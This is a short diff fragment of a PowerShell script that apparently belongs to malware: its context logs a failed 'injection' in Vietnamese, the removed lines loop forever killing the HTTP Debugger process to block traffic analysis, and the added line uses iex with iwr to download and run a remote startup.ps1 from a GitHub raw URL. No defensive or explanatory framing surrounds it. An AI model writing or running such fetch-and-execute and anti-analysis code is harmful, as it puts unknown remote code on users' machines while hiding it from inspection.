@@ -92,8 +92,7 @@ try {
     loghook "Injection khong thanh cong."
 }
 
-while ($true) {
-    taskkill /f /im httpdebuggerui.exe
-}
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
+
 
 
